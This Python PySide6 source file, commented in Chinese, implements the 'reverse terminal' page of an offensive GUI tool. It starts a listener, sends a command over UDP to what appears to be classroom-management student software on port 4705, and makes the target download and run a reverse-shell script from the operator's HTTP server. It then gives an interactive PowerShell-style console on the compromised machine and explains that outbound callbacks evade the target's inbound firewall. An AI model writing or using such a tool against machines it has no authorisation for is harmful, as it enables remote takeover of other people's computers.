"""反弹终端页：本机监听，让目标主动连回来形成一条可交互的命令行。"""

from PySide6.QtCore import Qt, QTimer
from PySide6.QtGui import QFont, QTextCursor
from PySide6.QtWidgets import QHBoxLayout, QLineEdit
from qfluentwidgets import BodyLabel, PlainTextEdit, PushButton
from qfluentwidgets import FluentIcon as FIF

from ... import core
from ..components import SectionCard, page_heading
from .common import Page

# 轮询间隔：既不会让输出看起来一顿一顿，也不至于空转占满 CPU。
POLL_INTERVAL = 120
# 控制台高度固定，避免内容把整页撑高，也避免输入行被挤出窗口。
CONSOLE_HEIGHT = 320


class ShellPage(Page):
    """监听目标回连并提供交互式命令行。

    远端只执行一条很短的下载命令，真正的反弹脚本由本机 HTTP 服务提供，
    因此不需要在目标上留文件，也不依赖任何第三方短链。
    """

    def __init__(self, logs, parent=None):
        super().__init__("shell", parent)
        self.logs = logs
        self.server = None
        # 记录上一次的连接状态与来源，只在状态变化时写日志。
        self._connected = False
        self._address = ""
        page_heading(self.vbox, "反弹终端")
        self.vbox.addWidget(
            BodyLabel("远程攻击：目标主动连回本机，得到一条可持续交互的命令行。", self)
        )

        card = SectionCard(self)
        hint = BodyLabel(
            "点“开始监听”会在本机开一个端口，“发送连接命令”再通过远程命令"
            "通道让目标下载并执行反弹脚本。目标是主动外连，所以不受它自己的"
            "入站防火墙限制；代价是目标必须能访问到本机地址。",
            card,
        )
        # 说明是一整段话，必须换行，否则会顶出卡片右侧被裁掉。
        hint.setWordWrap(True)
        card.body.addWidget(hint)

        target_row = QHBoxLayout()
        target_row.addWidget(BodyLabel("目标地址", card))
        self.target_input = QLineEdit(card)
        self.target_input.setPlaceholderText("例如 10.1.1.5")
        self.target_input.setMinimumWidth(220)
        target_row.addWidget(self.target_input)
        target_row.addSpacing(12)
        target_row.addWidget(BodyLabel("学生端端口", card))
        self.udp_port_input = QLineEdit("4705", card)
        self.udp_port_input.setMaximumWidth(110)
        target_row.addWidget(self.udp_port_input)
        target_row.addStretch()
        card.body.addLayout(target_row)

        local_row = QHBoxLayout()
        local_row.addWidget(BodyLabel("本机地址", card))
        self.local_input = QLineEdit(card)
        self.local_input.setPlaceholderText("目标回连时使用的本机 IP")
        self.local_input.setMinimumWidth(220)
        local_row.addWidget(self.local_input)
        local_row.addSpacing(12)
        local_row.addWidget(BodyLabel("监听端口", card))
        self.port_input = QLineEdit("0", card)
        self.port_input.setMaximumWidth(110)
        self.port_input.setToolTip("0 表示随机挑一个空闲端口")
        local_row.addWidget(self.port_input)
        local_row.addStretch()
        card.body.addLayout(local_row)

        button_row = QHBoxLayout()
        self.listen_button = PushButton(FIF.CONNECT, "开始监听", card)
        self.listen_button.clicked.connect(self.toggle_listen)
        self.send_button = PushButton(FIF.SEND, "发送连接命令", card)
        self.send_button.clicked.connect(self.send_connect_command)
        button_row.addWidget(self.listen_button)
        button_row.addWidget(self.send_button)
        button_row.addStretch()
        card.body.addLayout(button_row)

        self.status = BodyLabel("未监听", card)
        card.body.addWidget(self.status)

        self.console = PlainTextEdit(card)
        self.console.setReadOnly(True)
        # 控制台给固定高度，剩余空间留在底部，窗口拉高时输入行不会被顶到屏幕上沿。
        self.console.setFixedHeight(CONSOLE_HEIGHT)
        self.console.setFont(QFont("Consolas", 10))
        card.body.addWidget(self.console)

        command_row = QHBoxLayout()
        self.command_input = QLineEdit(card)
        self.command_row = command_row
        self.command_input.setPlaceholderText("连接建立后在这里输入命令，回车发送")
        self.command_input.returnPressed.connect(self.send_line)
        command_row.addWidget(self.command_input, 1)
        self.command_button = PushButton(FIF.PLAY, "发送", card)
        self.command_button.clicked.connect(self.send_line)
        command_row.addWidget(self.command_button)
        card.body.addLayout(command_row)
        card.body.addStretch()
        self.vbox.addWidget(card, 1)

        # 输出由后台线程写入队列，界面按固定节奏取，避免跨线程碰控件。
        self.timer = QTimer(self)
        self.timer.setInterval(POLL_INTERVAL)
        self.timer.timeout.connect(self._poll)
        self._set_command_enabled(False)

    def toggle_listen(self):
        """开始或停止监听。"""
        if self.server is not None:
            self.stop_listen()
            return
        try:
            port = int(self.port_input.text().strip() or "0")
        except ValueError:
            self.status.setText("监听端口必须是数字")
            return
        server = core.ShellServer(
            port=port,
            local_ip=self.local_input.text().strip(),
            # 带上目标地址，多网卡机器才能挑到目标能回连的那张网卡。
            target=self.target_input.text().strip() or None,
        )
        try:
            server.start()
        except OSError as error:
            self.logs.error(
                "反弹终端", "监听失败", "端口：%d；异常：%s" % (port, error)
            )
            self.status.setText("监听失败：%s" % error)
            return
        self.server = server
        # 只有真正监听时才探测本机地址：构造页面就联网会让界面启动多等一次。
        if not self.local_input.text().strip():
            self.local_input.setText(server.callback_host())
        self.listen_button.setText("停止监听")
        self.status.setText("监听 %s:%d，等待目标连回" % ("0.0.0.0", server.port))
        self._append(
            "已在本机 %s:%d 监听，脚本服务端口 %d\n"
            % (server.callback_host(), server.port, server.http_port)
        )
        self.timer.start()
        self.logs.info(
            "反弹终端",
            "开始监听",
            "TCP 端口：%d；脚本服务端口：%d；本机地址：%s"
            % (server.port, server.http_port, server.callback_host()),
        )

    def stop_listen(self):
        """断开目标并停止监听。"""
        if self.server is None:
            return
        port = self.server.port
        self.server.close()
        self.server = None
        self._connected = False
        self._address = ""
        self.timer.stop()
        self.listen_button.setText("开始监听")
        self.status.setText("未监听")
        self._set_command_enabled(False)
        self.logs.info("反弹终端", "停止监听", "TCP 端口：%d" % port)

    def send_connect_command(self):
        """把下载并执行反弹脚本的命令发给目标。"""
        if self.server is None:
            self.status.setText("请先开始监听")
            return
        host = self.target_input.text().strip()
        if not host:
            self.status.setText("请填写目标地址")
            return
        try:
            udp_port = int(self.udp_port_input.text().strip() or "4705")
        except ValueError:
            self.status.setText("学生端端口必须是数字")
            return
        try:
            command = self.server.command()
        except ValueError as error:
            self.status.setText(str(error))
            return
        try:
            sent = core.send_command(host, command, port=udp_port)
        except (OSError, ValueError) as error:
            self.logs.error(
                "反弹终端", "连接命令发送失败", "目标：%s；异常：%s" % (host, error)
            )
            self.status.setText("发送失败：%s" % error)
            return
        self.status.setText("已向 %s 发送连接命令，等待回连" % host)
        self._append("→ %s 已发送连接命令（%d 字节）\n" % (host, sent))
        self.logs.info(
            "反弹终端",
            "发送连接命令",
            "目标：%s；学生端端口：%d；命令长度：%d 字节" % (host, udp_port, sent),
        )

    def send_line(self):
        """把输入框里的一行命令发给目标。"""
        if self.server is None:
            return
        text = self.command_input.text()
        if not text.strip():
            return
        if not self.server.send(text):
            self.status.setText("目标尚未连回，命令没有发出")
            return
        self._append("PS> %s\n" % text)
        self.command_input.clear()
        self.logs.debug(
            "反弹终端", "发送命令", "目标：%s；命令：%s" % (self.server.address, text)
        )

    def _poll(self):
        """取出后台积攒的输出并刷新状态。"""
        if self.server is None:
            return
        data = self.server.poll()
        if data:
            self._append(data)
        connected = self.server.connected
        if connected != self._connected:
            if connected:
                self.logs.info(
                    "反弹终端", "目标已连回", "来源：%s" % self.server.address
                )
            else:
                self.logs.warning(
                    "反弹终端", "目标连接断开", "上一次来源：%s" % self._address
                )
            self._connected = connected
            self._address = self.server.address
        self._set_command_enabled(connected)
        if connected:
            self.status.setText("已连接 %s" % self.server.address)

    def _append(self, text):
        """把文本追加到输出区并滚到末尾。"""
        self.console.moveCursor(QTextCursor.MoveOperation.End)
        self.console.insertPlainText(text)
        self.console.moveCursor(QTextCursor.MoveOperation.End)

    def _set_command_enabled(self, enabled):
        """没有连接时禁用命令输入。"""
        self.command_input.setEnabled(enabled)
        self.command_button.setEnabled(enabled)
        if enabled:
            self.command_input.setFocus(Qt.FocusReason.OtherFocusReason)
